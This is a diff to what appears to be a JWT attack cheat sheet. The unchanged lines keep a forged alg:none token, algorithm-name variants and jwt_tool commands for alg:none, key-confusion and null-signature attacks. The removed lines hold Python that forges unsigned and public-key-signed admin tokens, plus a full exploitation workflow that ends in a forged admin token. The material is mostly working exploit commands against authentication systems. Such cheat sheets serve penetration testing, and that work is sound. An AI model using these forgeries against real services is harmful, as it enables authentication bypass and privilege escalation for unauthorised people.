@@ -20,12 +20,6 @@ eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJsb2dpbiI6ImFkbWluIn0.
 
 Algorithm variants to try: `none`, `None`, `NONE`, `nOnE`
 
-```python
-import jwt
-decoded = jwt.decode(token, options={"verify_signature": False})
-forged = jwt.encode(decoded, key='', algorithm=None)
-```
-
 ```bash
 python3 jwt_tool.py [JWT] -X a
 ```
@@ -43,13 +37,6 @@ cat public.pem | xxd -p | tr -d "\\n"
 
 # 3. Sign with public key as HMAC secret
 python3 jwt_tool.py [JWT] -X k -pk public.pem
-```
-
-```python
-import jwt
-public = open('public.pem', 'r').read()
-payload = {"user": "admin", "role": "admin"}
-token = jwt.encode(payload, key=public, algorithm='HS256')
 ```
 
 ## JWK Header Injection (CVE-2018-0114)
@@ -153,24 +140,6 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
 
 ```bash
 python3 jwt_tool.py [JWT] -X n
-```
-
-## Exploitation Workflow
-
-```bash
-# 1. Decode and inspect
-python3 jwt_tool.py [JWT]
-
-# 2. Test all attack vectors
-python3 jwt_tool.py [JWT] -X a               # alg:none
-python3 jwt_tool.py [JWT] -X k -pk pub.pem   # key confusion
-python3 jwt_tool.py [JWT] -X i               # JWK injection
-python3 jwt_tool.py [JWT] -X s               # JKU injection
-python3 jwt_tool.py [JWT] -X n               # null signature
-python3 jwt_tool.py [JWT] -d wordlist.txt -C # brute-force
-
-# 3. Forge token with modified claims
-python3 jwt_tool.py [JWT] -I -pc role -pv admin -S hs256 -p "secret"
 ```
 
 ## JWKS Endpoints to Probe
